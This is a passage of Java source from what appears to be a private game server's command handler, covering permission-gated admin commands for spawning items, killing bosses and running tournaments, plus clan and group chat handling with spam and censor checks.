                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                c.getBank().deleteAllItems();
                Arrays.stream(Plants.values()).forEach(plant -> c.getInventory().addToBank(new ImmutableItem(plant.seed, 5000)));
                c.getInventory().addToBank(new ImmutableItem(Items.RAKE));
                c.getInventory().addToBank(new ImmutableItem(Items.WATERING_CAN8));
                c.getInventory().addToBank(new ImmutableItem(Items.SEED_DIBBER));
                c.getInventory().addToBank(new ImmutableItem(Items.SECATEURS));
            }

            if (playerCommand.startsWith("killnightmare")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                ((Nightmare) NPCHandler.getNpc(NightmareConstants.NIGHTMARE_ACTIVE_ID, c.getPosition().getHeight())).kill();
            }

            if (Server.isDebug() && playerCommand.equals("td")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                TourneyManager.getSingleton().setNextTourneyType("dharok");
                WorldEventContainer.getInstance().startEvent(new TournamentWorldEvent());
            }

            if (Server.isDebug() && playerCommand.equals("endtourney")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                TourneyManager.getSingleton().endGame();
            }

            if (playerCommand.startsWith("item")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {
                    if (args.length >= 2) {
                        int newItemID = Integer.parseInt(args[1]);
                        int newItemAmount = 1;
                        if (args.length > 2) {
                            newItemAmount = Integer.parseInt(args[2]);
                        }

                        if ((newItemID <= 40000) && (newItemID >= 0)) {
                            c.getItems().addItem(newItemID, newItemAmount);
                            c.sendMessage("Spawned {}x {}.", newItemAmount, ItemDef.forId(newItemID).getName());
                        } else {
                            c.sendMessage("No such item.");
                        }
                    } else {
                        c.sendMessage("Use as ::item id amount.");
                    }
                } catch (Exception e) {

                }
            }

            if (playerCommand.startsWith("maxrange")) {
                if (!isManagment && !Server.getConfiguration().getServerState().isOpenSpawning()) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }
                for (int slot = 0; slot < c.playerItems.length; slot++)
                    if (c.playerItems[slot] > 0 && c.playerItemsN[slot] > 0) {
                        c.getItems().addToBank(c.playerItems[slot] - 1, c.playerItemsN[slot], false);

                    }
                for (int slot = 0; slot < c.playerEquipment.length; slot++) {
                    if (c.playerEquipment[slot] > 0 && c.playerEquipmentN[slot] > 0) {
                        if (c.getItems().addEquipmentToBank(c.playerEquipment[slot], slot, c.playerEquipmentN[slot],
                                false)) {
                            c.getItems().equipItem(-1, 0, slot);
                        } else {
                            c.sendMessage("Your bank is full.");
                            break;
                        }
                    }
                }
                c.getItems().addContainerUpdate(ContainerUpdate.INVENTORY);
                c.getItems().queueBankContainerUpdate();
                c.getItems().resetTempItems();
                c.getItems().equipItem(6585, 1, Player.playerAmulet);
                c.getItems().equipItem(22109, 1, Player.playerCape);
                c.getItems().equipItem(13237, 1, Player.playerFeet);
                c.getItems().equipItem(11785, 1, Player.playerWeapon);
                c.getItems().equipItem(11664, 1, Player.playerHat);
                c.getItems().equipItem(13072, 1, Player.playerChest);
                c.getItems().equipItem(13073, 1, Player.playerLegs);
                c.getItems().equipItem(11284, 1, Player.playerShield);
                c.getItems().equipItem(11771, 1, Player.playerRing);
                c.getItems().equipItem(8842, 1, Player.playerHands);
                c.getItems().addItem(12695, 1);
                c.getItems().addItem(3024, 1);
                c.getItems().addItem(6685, 2);
                c.getItems().addItem(9244, 2000);
                c.getItems().addItem(385, 15);
            }

            if (playerCommand.startsWith("killhespori")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                HesporiSpawner.getHespori().appendDamage(Integer.MAX_VALUE, Hitmark.HIT);
            }

            if (playerCommand.startsWith("/")) {
                int minimumRequiredSize = 29;
                int crownTextSize = c.getRights().getCrowns().length();
                int titleTextSize = c.getTitles().getCurrentTitle().length();
                int nameTextSize = c.getDisplayName().length();

                int messageCap = minimumRequiredSize + crownTextSize + titleTextSize + nameTextSize;
                playerCommand = playerCommand.substring(0, Math.min(130 - messageCap, playerCommand.length()));
                if (!Misc.isValidChatMessage(playerCommand)) {
                    c.sendMessage("Invalid message.");
                    return;
                }

                if (playerCommand.startsWith("//")) {
                    GroupIronman.sendGroupMessage(c, playerCommand);
                } else {
                    if (Misc.isSpam(playerCommand)) {
                        c.sendMessage("Please don't spam.");
                        return;
                    }
                    handleClanMessaging(c, playerCommand);
                }
                return;
            }

            /***
             * Rad's Commands
             *

            if (playerCommand.startsWith("tpco")) {
                if (!isManagment) {
                    c.sendMessage(NO_ACCESS);
                    return;
                }

                try {
                    if (args.length == 3) {
                        c.setTeleportToX(Integer.parseInt(args[0]));
                        c.setTeleportToY(Integer.parseInt(args[1]));
                        c.heightLevel = Integer.parseInt(args[2]);

                        c.sendMessage("Teleported to x: " + args[1] + " y: " + args[2] + " z: " + args[3]);
                    } else {
                        c.sendMessage("Invalid arguments. Usage: ::tpco [x] [y] [z]");
                    }
                } catch (Exception e) {
                    c.sendMessage("Error occurred. Usage: ::tpco [x] [y] [z]");
                    System.out.println("Error executing ::tpco command by: " + c.getDisplayName());
                }
            }*/
        } catch (Exception e) {
            e.printStackTrace();
            c.sendMessage("An occurred while executing that command, please try again.");
        }

        CommandManager.execute(c, playerCommand);
    }

    private void handleClanMessaging(Player player, String query) {
        if (Server.getPunishments().contains(PunishmentType.MUTE, player.getLoginName()) || Server.getPunishments().contains(PunishmentType.NET_BAN, player.connectedFrom)) {
            player.sendMessage("You are muted for breaking a rule.");
            return;
        }
        if (player.clan != null) {
            Server.getLogging().write(new ClanChatLog(player, query, player.clan.getFounder()));
            if (Censor.isCensored(player, query)) {
                return;
            }
            player.clan.sendChat(player, query);
            return;
        }
        player.sendMessage("You can only do this in a clan chat..");
    }
}
